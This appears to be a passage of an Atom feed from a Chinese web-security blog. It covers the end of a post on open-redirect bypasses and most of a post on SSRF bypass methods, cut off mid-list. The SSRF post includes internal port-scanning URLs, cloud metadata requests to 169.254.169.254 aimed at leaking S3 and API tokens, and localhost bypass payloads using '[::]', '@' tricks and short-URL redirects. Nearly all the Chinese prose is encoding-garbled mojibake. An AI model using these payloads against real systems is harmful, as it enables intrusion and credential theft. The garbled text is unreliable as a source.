face="å¾®è½¯é›…é»‘">æ¯”å¦‚ä¸€ä¸ªURLï¼Œå®ƒæ˜¯å¯ä»¥ç›´æ¥è·³è½¬çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æµ‹è¯•è·³è½¬æ—¶å¤§å®¶ä¹ æƒ¯ç”¨<a href="http://www.baidu.comæˆ–qq.comè¿™æ ·çš„å¯ä¿¡ç«™ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æœ‰äº›ç½‘ç«™æ˜¯å¯ä»¥è·³è½¬è¿™äº›ç½‘ç«™çš„ã€‚" target="_blank" rel="noopener">www.baidu.comæˆ–qq.comè¿™æ ·çš„å¯ä¿¡ç«™ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æœ‰äº›ç½‘ç«™æ˜¯å¯ä»¥è·³è½¬è¿™äº›ç½‘ç«™çš„ã€‚</a><br>åªè¦æ˜¯å¯ä¿¡ç«™ç‚¹ä¸”å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆè¿™å°±å±äºæ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘äº†ï¼Œéš¾é“å°±è¿™æ ·é”™å¤±ä¸€ä¸ªURLè·³è½¬æ¼æ´äº†ï¼Ÿ<br>å…¶å®ä¸ç„¶ï¼Œåªè¦ä½ çš„URLè¢«ç™¾åº¦æ”¶å½•è¿‡ï¼Œé‚£ä¹ˆç›´æ¥æœç´¢ä½ çš„åŸŸåï¼Œsite:xxx.xxx<br>å› ä¸ºä½ åœ¨ç™¾åº¦é‡Œç‚¹å‡»ä½ çš„åŸŸåï¼Œå®ƒä¼šå…ˆæ˜¯ä¸€ä¸ª302è·³è½¬ï¼Œè€Œè¿™ä¸ª302è·³è½¬å°±æ˜¯ç™¾åº¦ä¸‹çš„302è·³è½¬ï¼Œé‚£ä¹ˆè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹çš„é™åˆ¶ï¼Œä»è€Œè¾¾åˆ°è·³è½¬åˆ°æŒ‡å®šURLã€‚<br>å½“ç„¶ï¼Œç™¾åº¦è¿™ä¸ª302æœ‰ç‚¹é•¿ï¼Œä½ ç»™å®ƒè¿›è¡ŒåŠ å¯†å°±è¡Œã€‚</font></li></ul><h3><span id="0x09-postå‚æ•°ä¸­çš„urlè·³è½¬">0x09 POSTå‚æ•°ä¸­çš„URLè·³è½¬</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">å½“ç„¶ï¼Œè¿™ä¸ªå½±å“å°±å¾ˆå°äº†ï¼Œæ¯”å¦‚å½“ä½ å¡«ä»€ä¹ˆè¡¨æ ¼æˆ–è€…éœ€è¦å¡«å†™ä»€ä¹ˆçš„ï¼Œå½“ä½ ä¸Šä¼ å›¾ç‰‡ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥çš„æ—¶å€™ï¼Œé€šå¸¸ä¸‹ä¸€æ­¥å°±æ˜¯é¢„è§ˆä½ å¡«å†™çš„ä¿¡æ¯ï¼Œæœ€åæ‰æ˜¯æäº¤ã€‚<br>å½“ä½ ä¸Šä¼ äº†å›¾ç‰‡åç‚¹å‡»ä¸‹ä¸€æ­¥æŠ“åŒ…ï¼Œå¦‚æœè¿‡æ»¤ä¸ä¸¥ï¼Œä½ ä¼šçœ‹åˆ°å›¾ç‰‡çš„å®Œæ•´åœ°å€åŒ…å«åœ¨POSTå‚æ•°é‡Œï¼Œä½ å°±å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™ä¸ªåœ°å€ä¸ºä»»æ„URLï¼Œç„¶ååˆ°è¾¾ä¸‹ä¸€æ­¥ã€‚<br>è¿™æ—¶æ˜¯ç¡®å®šä¿¡æ¯ä¹Ÿå°±æ˜¯é¢„è§ˆè‡ªå·±å¡«å†™çš„ä¿¡æ¯çš„æ­£ç¡®è¿˜æ˜¯ä¸æ­£ç¡®ï¼Œç”±äºä½ åˆšåˆšä¿®æ”¹äº†å›¾ç‰‡åœ°å€ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œå›¾åƒä¼šæ˜¯ä¸€ä¸ªå°XXã€‚<br>å½“ç‚¹å‡»å›¾ç‰‡å³é”®é€‰æ‹©æŸ¥çœ‹å›¾åƒæ—¶ï¼Œå°±ä¼šè§¦å‘URLè·³è½¬é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªä¹Ÿå¯ä»¥åˆ©ç”¨æ¥è¿›è¡Œé’“é±¼ï¼Œé’“åå°å®¡æ ¸å‘˜çš„ä¿¡æ¯ã€‚<br>ä¸ºä»€ä¹ˆå‘¢ï¼Œæ¯”å¦‚å®¡æ ¸çœ‹åˆ°å›¾ç‰‡æ— æ³•åŠ è½½ï¼Œä¸€èˆ¬éƒ½ä¼šç‚¹å‡»æŸ¥çœ‹å›¾ç‰‡ï¼Œç„¶åè·³è½¬ï¼Œå¦‚æœå®‰å…¨æ„è¯†ä¸çŸ¥å°±ä¼šé€ æˆå®‰å…¨å½±å“ã€‚<br>å½“ç„¶ï¼Œå¦‚æœPOSTå‚æ•°é‡Œå°±åªæ˜¯URLè·³è½¬å‚æ•°ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç»™å®ƒè½¬æˆGETæ–¹å¼ï¼Œç„¶åè¿›è¡Œè·³è½¬å°±å¯ä»¥äº†ï¼Œåªè¦ç½‘ç«™æ”¯æŒè¿™æ ·çš„GETæ–¹å¼å°±è¡Œã€‚<br>åœ¨Burp Suiteé‡Œå¯ä»¥ä¸€é”®è½¬æ¢æäº¤æ–¹å¼ï¼Œå³é”®é€‰æ‹©Change request methodå°±å¯ä»¥ï¼</font></li></ul><h3><span id="0x10-åˆ©ç”¨å·ç»•è¿‡">0x10 åˆ©ç”¨#å·ç»•è¿‡</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">å¦‚ï¼š<a href="http://www.aaa.com/acb?Url=http://test.com#login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</a></font></li></ul><h3><span id="0x09-fuzz">0x09 FUZZ</span></h3><ul><li><font face="å¾®è½¯é›…é»‘">é‡å®šå‘Payloads by @cujanovic<br><a href="https://github.com/cujanovic/Open-Redirect-Payloads" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads</a></font></li><li><font face="å¾®è½¯é›…é»‘">é‡å®šå‘å‚æ•° by @fuzzdb-project<br><a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt</a></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-å¦‚ä½•ç»•è¿‡urlé™åˆ¶&quot;&gt;1ã€å¦‚ä½•ç»•è¿‡URLé™åˆ¶&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-æè¿°&quot;&gt;1.1ã€æè¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-æ­£å¸¸æ€è·¯&quot;&gt;1.2ã€æ­£å¸¸æ€è·¯ï¼š&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SSRFç»•è¿‡çš„æ–¹æ³•</title>
    <link href="http://www.vkxss.top/2019/07/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SSRF%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.vkxss.top/2019/07/19/æ¸—é€æµ‹è¯•-SSRFç»•è¿‡çš„æ–¹æ³•/</id>
    <published>2019-07-19T06:25:40.000Z</published>
    <updated>2019-10-17T14:57:40.371Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-ssrf">1ã€SSRF</a><ul><li><a href="#11-æè¿°">1.1ã€æè¿°ï¼š</a></li><li><a href="#12-æ¼æ´å¯»æ‰¾">1.2ã€æ¼æ´å¯»æ‰¾ï¼š</a></li><li><a href="#13-æ¼æ´éªŒè¯">1.3 æ¼æ´éªŒè¯</a></li><li><a href="#14-åˆ©ç”¨æ–¹å¼">1.4 åˆ©ç”¨æ–¹å¼</a></li><li><a href="#15-æ¼æ´åˆ©ç”¨ç¤ºä¾‹">1.5ã€æ¼æ´åˆ©ç”¨ç¤ºä¾‹ï¼š</a></li><li><a href="#16-bypass">1.6ã€Bypass</a></li><li><a href="#17-ssrfå±å®³">1.7 SSRFå±å®³</a></li><li><a href="#18-æ¼æ´ä¿®å¤">1.8 æ¼æ´ä¿®å¤</a></li><li><a href="#19-å‚è€ƒæ–‡ç« ">1.9 å‚è€ƒæ–‡ç« </a></li></ul></li></ul><!-- tocstop --><h1><span id="1-ssrf">1ã€SSRF</span></h1><h2><span id="11-æè¿°">1.1ã€æè¿°ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">SSRF(Server-Side Request Forgery)æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</font></li></ul><h2><span id="12-æ¼æ´å¯»æ‰¾">1.2ã€æ¼æ´å¯»æ‰¾ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">åˆ†äº«åŠŸèƒ½ï¼Œé€šè¿‡ URL åœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</font></p><p>  <font face="å¾®è½¯é›…é»‘">æ—©æœŸåˆ†äº«åº”ç”¨ä¸­ï¼Œä¸ºäº†æ›´å¥½çš„æä¾›ç”¨æˆ·ä½“éªŒï¼ŒWEBåº”ç”¨åœ¨åˆ†äº«åŠŸèƒ½ä¸­ï¼Œé€šå¸¸ä¼šè·å–ç›®æ ‡URLåœ°å€ç½‘é¡µå†…å®¹ä¸­çš„<tilte>æ ‡ç­¾æˆ–è€…<meta name="description" content="â€œâ€/">æ ‡ç­¾ä¸­contentçš„æ–‡æœ¬å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</tilte></font></p></li><li><p><font face="å¾®è½¯é›…é»‘">è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</font></p><p>  <font face="å¾®è½¯é›…é»‘">ç”±äºæ‰‹æœºå±å¹•å¤§å°çš„å…³ç³»ï¼Œç›´æ¥æµè§ˆç½‘é¡µå†…å®¹çš„æ—¶å€™ä¼šé€ æˆè®¸å¤šä¸ä¾¿ï¼Œå› æ­¤æœ‰äº›å…¬å¸æä¾›äº†è½¬ç åŠŸèƒ½ï¼ŒæŠŠç½‘é¡µå†…å®¹é€šè¿‡ç›¸å…³æ‰‹æ®µè½¬ä¸ºé€‚åˆæ‰‹æœºå±å¹•æµè§ˆçš„æ ·å¼ã€‚ä¾‹å¦‚ç™¾åº¦ã€è…¾è®¯ã€æœç‹—ç­‰å…¬å¸éƒ½æœ‰æä¾›åœ¨çº¿è½¬ç æœåŠ¡</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">åœ¨çº¿ç¿»è¯‘ï¼šé€šè¿‡URLåœ°å€ç¿»è¯‘å¯¹åº”æ–‡æœ¬çš„å†…å®¹ã€‚</font></p><p>  <font face="å¾®è½¯é›…é»‘">æä¾›æ­¤åŠŸèƒ½çš„å›½å†…å…¬å¸æœ‰ç™¾åº¦ã€æœ‰é“ç­‰</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</font></p><p><font face="å¾®è½¯é›…é»‘">å›¾ç‰‡åŠ è½½è¿œç¨‹å›¾ç‰‡åœ°å€æ­¤åŠŸèƒ½ç”¨åˆ°çš„åœ°æ–¹å¾ˆå¤šï¼Œä½†å¤§å¤šéƒ½æ˜¯æ¯”è¾ƒéšç§˜ï¼Œæ¯”å¦‚åœ¨æœ‰äº›å…¬å¸ä¸­çš„åŠ è½½è‡ªå®¶å›¾ç‰‡æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ç”¨äºå±•ç¤ºã€‚ï¼ˆå¼€å‘è€…ä¸ºäº†æœ‰æ›´å¥½çš„ç”¨æˆ·ä½“éªŒé€šå¸¸å¯¹å›¾ç‰‡åšäº›å¾®å°è°ƒæ•´ä¾‹å¦‚åŠ æ°´å°ã€å‹ç¼©ç­‰ï¼Œæ‰€ä»¥å°±å¯èƒ½é€ æˆSSRFé—®é¢˜ï¼‰</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½<br>  <font face="å¾®è½¯é›…é»‘">æ­¤å¤„çš„å›¾ç‰‡ã€æ–‡ç« æ”¶è—ä¸­çš„æ–‡ç« æ”¶è—å°±ç±»ä¼¼äºåŠŸèƒ½ä¸€ã€åˆ†äº«åŠŸèƒ½ä¸­è·å–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºï¼Œç›®çš„è¿˜æ˜¯ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œè€Œå›¾ç‰‡æ”¶è—å°±ç±»ä¼¼äºåŠŸèƒ½å››ã€å›¾ç‰‡åŠ è½½</font></font></p></li><li><p><font face="å¾®è½¯é›…é»‘">æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½</font></p><p>  <font face="å¾®è½¯é›…é»‘">æ­¤å¤„ç±»ä¼¼çš„åŠŸèƒ½æœ‰360æä¾›çš„ç½‘ç«™è¯„åˆ†ï¼Œä»¥åŠæœ‰äº›ç½‘ç«™é€šè¿‡apiè·å–è¿œç¨‹åœ°å€xmlæ–‡ä»¶æ¥åŠ è½½å†…å®¹ã€‚</font></p></li><li><p>æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</p></li><li><p>é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</p></li><li><p>ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</p></li><li><p>æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´</p></li><li><p>ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</p></li><li><p>ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰</p></li><li><p>webé’©å­ï¼šå¯»æ‰¾è§¦å‘ç‰¹å®šäº‹ä»¶æ—¶å‘å‡ºhttpè¯·æ±‚çš„æœåŠ¡ã€‚åœ¨å¤§å¤šæ•°webé’©å­çš„åŠŸèƒ½ä¸­ï¼Œç»ˆç«¯ç”¨æˆ·å¯ä»¥é€‰æ‹©ä»–ä»¬çš„ç»ˆç«¯ç‚¹å’Œä¸»æœºåã€‚å°è¯•å‘å†…éƒ¨æœåŠ¡å‘é€httpè¯·æ±‚ã€‚</p></li><li><p>æ–‡æ¡£è§£æå™¨ï¼šå°è¯•äº†è§£æ–‡æ¡£æ˜¯å¦‚ä½•è¢«è§£æçš„ã€‚å¦‚æœæ˜¯XMLæ–‡æ¡£ï¼Œé‚£å°±æ˜¯ç”¨äº†PDFç”Ÿæˆå™¨æ–¹æ³•ã€‚å¯¹äºå…¶ä»–æ–‡æ¡£ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¼•ç”¨å¤–éƒ¨èµ„æºçš„æ–¹æ³•ç„¶åé€šè¿‡æœåŠ¡å™¨å‘å†…éƒ¨æœåŠ¡å‘é€è¯·æ±‚ã€‚</p></li><li><p>é“¾æ¥æ‰©å±•: æœ€è¿‘Mark Litchfieldåœ¨æ¨ç‰¹æ‰©å±•é“¾æ¥ä¸Šå‘ç°äº†æ¼æ´ï¼Œåå£°å¤§æ¶¨ã€‚</p></li><li><p>æ–‡ä»¶ä¸Šä¼ ï¼šä¸å¸¸è§„ä¸Šä¼ æ–‡ä»¶ç›¸åï¼Œå°è¯•å‘é€urlè¯·æ±‚ç„¶åæ£€æŸ¥æ˜¯å¦ä¸‹è½½äº†urlçš„å†…å®¹ã€‚<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">ä¾‹å­</a></p></li><li><p>PDFç”Ÿæˆå™¨ï¼šè¯•ç€æ³¨å…¥æŒ‡å‘å†…éƒ¨æœåŠ¡çš„<code>&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;æˆ–è€…&lt;script&gt;</code>å…ƒç´ æˆ–è€…CSSçš„url()å‡½æ•°ã€‚</p></li></ul><h2><span id="13-æ¼æ´éªŒè¯">1.3 æ¼æ´éªŒè¯</span></h2><ul><li>æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</span><br></pre></td></tr></table></figure><ul><li>dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—®</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥åœ¨ç›²æ‰“åå°ç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„uri å’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure><ul><li>æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ï¼Œæ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€</span><br><span class="line">é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€</span><br></pre></td></tr></table></figure><ul><li><p>ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯</p></li><li><p>ç•™æ„boolå‹SSRF</p></li></ul><h2><span id="14-åˆ©ç”¨æ–¹å¼">1.4  åˆ©ç”¨æ–¹å¼</span></h2><ul><li><p>è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€</p></li><li><p>è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms</p></li><li><p>å¯ä»¥ä½¿ç”¨fileã€dictã€gopher[11]ã€ftpåè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶</p></li><li><p>æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…{payload}ï¼‰</p></li><li><p>æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰</p></li><li><p>åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰ç«¯å£å¼€æ”¾</p></li></ul><p>â€‹- æŸäº›æ—¶å€™SSRFæ¼æ´å¯ä»¥ç”¨ä½œå±€åŸŸç½‘å†…çš„ç«¯å£æ‰«æã€‚è¿™æœ‰åŠ©äºç†æ¸…å†…ç½‘çš„åŸºç¡€è®¾æ–½è½®å»“å’Œå¹¶ä¸ºä¸‹ä¸€æ­¥å…¶ä»–æ¼æ´çš„åˆ©ç”¨åšé“ºå«ã€‚ä¸Šè¿°è¿™ç§æƒ…å†µé€šå¸¸æ˜¯æœ€ç®€å•çš„blind SSRFäº†ã€‚å¦‚æœä¹‹å‰çš„è„šæœ¬æ— æ³•å»ºç«‹è¿æ¥æˆ–æ”¶ä¸åˆ°æœåŠ¡å™¨å“åº”ï¼Œå¼‚å¸¸å°†è¢«æŠ›å‡ºã€‚åˆ©ç”¨è¿™ä¸ªç‰¹å¾å¯ä»¥è¯†åˆ«ç«¯å£æ˜¯å¦å¼€æ”¾ï¼ˆè¿æ¥å»ºç«‹ï¼‰æˆ–å…³é—­ï¼ˆè¿æ¥å¤±è´¥æˆ–è¶…æ—¶ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL parameterResponse HTTP statusRTTConclusion</span><br><span class="line">http://127.0.0.1:2220010msPort is open</span><br><span class="line">http://127.0.0.1:2350010msPort is closed</span><br><span class="line">http://10.0.0.1/50030010msFirewalled or unable to route traffic to server</span><br><span class="line">http://10.0.0.1:8080/50010msPort is closed and traffic is routed to server</span><br></pre></td></tr></table></figure><ul><li><p>å¯¹äºå¼€æ”¾å’Œå…³é—­çš„ç«¯å£ï¼Œæ¯ä¸ªSSRFå“åº”éƒ½ä¸åŒã€‚è¯•ç€ä»¥ä¸åŒçš„å“åº”ä¸ºåŸºç¡€å»ºç«‹ä¸€ä¸ªå¼€æ”¾ã€é—­åˆç«¯å£å’Œæ ‡å¿—ç¬¦ä¹‹é—´çš„æ˜ å°„ã€‚ä¸Šé¢çš„è¡¨æ ¼å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p></li><li><p>DoSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥keep-alive alwaysï¼‰</p></li><li><p>æå–EC2é…ç½®æ–‡ä»¶<br>  è¶Šæ¥è¶Šå¤šçš„å…¬å¸å°†éƒ¨åˆ†åŸºç¡€è®¾æ–½æ”¾åˆ°äºšé©¬é€Šçš„EC2æœåŠ¡å™¨ä¸Šã€‚äºšé©¬é€Šå…¬å¼€å†…éƒ¨æœåŠ¡ï¼Œæ¯å°ECå®ä¾‹éƒ½èƒ½æŸ¥è¯¢ä¸»æœºå…ƒæ•°æ®ã€‚è¿™æ˜¯AWSæ–‡æ¡£ã€‚å¦‚æœä½ åœ¨EC2ä¸Šå‘ç°äº†SSRFæ¼æ´ï¼Œè¯•ç€è¯·æ±‚<a href="http://169.254.169.254/latest/meta-dataã€‚å“åº”ä¼šæä¾›è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ä¾¿äºå¯¹åŸºç¡€è®¾æ–½æœ‰ä¸€å®šçš„äº†è§£ï¼Œç”šè‡³å¯èƒ½ä¼šæ³„æ¼äºšé©¬é€ŠS3çš„è®¿é—®tokenï¼ŒAPI" target="_blank" rel="noopener">http://169.254.169.254/latest/meta-dataã€‚å“åº”ä¼šæä¾›è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ä¾¿äºå¯¹åŸºç¡€è®¾æ–½æœ‰ä¸€å®šçš„äº†è§£ï¼Œç”šè‡³å¯èƒ½ä¼šæ³„æ¼äºšé©¬é€ŠS3çš„è®¿é—®tokenï¼ŒAPI</a> tokenç­‰ç­‰ã€‚ä½ ä¹Ÿå¯ä»¥ä¸‹è½½_ <a href="http://169.254.169.254/latest/user-data_å’Œè§£å‹æ•°æ®ã€‚" target="_blank" rel="noopener">http://169.254.169.254/latest/user-data_å’Œè§£å‹æ•°æ®ã€‚</a></p></li></ul><h2><span id="15-æ¼æ´åˆ©ç”¨ç¤ºä¾‹">1.5ã€æ¼æ´åˆ©ç”¨ç¤ºä¾‹ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">æŸåº¦ç¿»è¯‘SSRFï¼š<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hbf43dfb33cbc43939b24042c7530c24fR.jpg" style="zoom:50%"></center><br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H8a618cf2914f452aa323c5c7e921d91c9.jpg" style="zoom:50%"></center></font></font></font></p></li><li><p><font face="å¾®è½¯é›…é»‘">æŸçŸ­ç½‘å€SSRFï¼š<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H8595608792b545259736dcaa13594142U.jpg" style="zoom:50%"></center></font></font></p></li></ul><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hb286c698c7a44e9fa59db20af8adfc82L.jpg" style="zoom:50%"></center></font></p><h2><span id="16-bypass">1.6ã€Bypass</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">1.4.1 æ”»å‡»æœ¬åœ°</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.2åˆ©ç”¨[::]</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨[::]ç»•è¿‡localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">ä¹Ÿæœ‰çœ‹åˆ°åˆ©ç”¨http://0000::1:80/çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æœªæˆåŠŸ</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.3åˆ©ç”¨@</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br><span class="line">http://A.com:B@127.0.0.1</span><br><span class="line">127.0.0.1#http://abc</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">1.4.4åˆ©ç”¨çŸ­åœ°å€</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰ç™¾åº¦çŸ­ç½‘å€è½¬æ¢ï¼šhttps://dwz.cn#ä¸æ”¯æŒip</span><br><span class="line">    http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">    </span><br><span 